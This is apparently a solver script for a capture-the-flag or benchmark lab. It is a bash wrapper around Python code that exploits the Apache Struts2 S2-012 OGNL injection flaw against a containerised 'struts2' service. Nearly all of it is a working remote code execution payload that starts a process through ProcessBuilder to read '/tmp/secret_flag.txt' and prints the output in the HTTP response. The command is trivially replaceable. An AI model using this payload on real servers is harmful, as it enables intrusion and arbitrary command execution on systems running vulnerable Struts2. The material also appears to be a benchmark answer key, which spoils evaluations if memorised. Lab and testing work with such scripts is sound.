#!/bin/bash
set -e

URL_BASE="http://struts2:8080"

# Wait for service to be ready
wait_for_service() {
    echo "Waiting for Struts2 to be ready..."
    for i in {1..30}; do
        if curl -s -f "$URL_BASE/" > /dev/null 2>&1; then
            echo "Service is ready"
            return 0
        fi
        sleep 2
    done
    echo "Service failed to become ready"
    return 1
}

wait_for_service

# Exploit S2-012 OGNL injection via redirect parameter
# When Action result uses redirect with ${name}, the name parameter value is evaluated as OGNL
# This allows direct OGNL injection without any restrictions

python <<'PYTHON_EOF'
import urllib.parse
import urllib.request
import sys

url = "http://struts2:8080/user.action"

# OGNL payload - same as S2-001, executes command and writes output to HTTP response
# Uses ProcessBuilder to execute: cat /tmp/secret_flag.txt
payload = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/tmp/secret_flag.txt"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

data = urllib.parse.urlencode({
    'name': payload
}).encode('utf-8')

try:
    # Follow redirects to get the final response
    response = urllib.request.urlopen(url, data)
    html = response.read().decode('utf-8')
    
    # The flag is written directly into the response by the OGNL expression
    print(html, flush=True)
    
except Exception as e:
    print(f"Error: {e}", file=sys.stderr, flush=True)
    sys.exit(1)
PYTHON_EOF
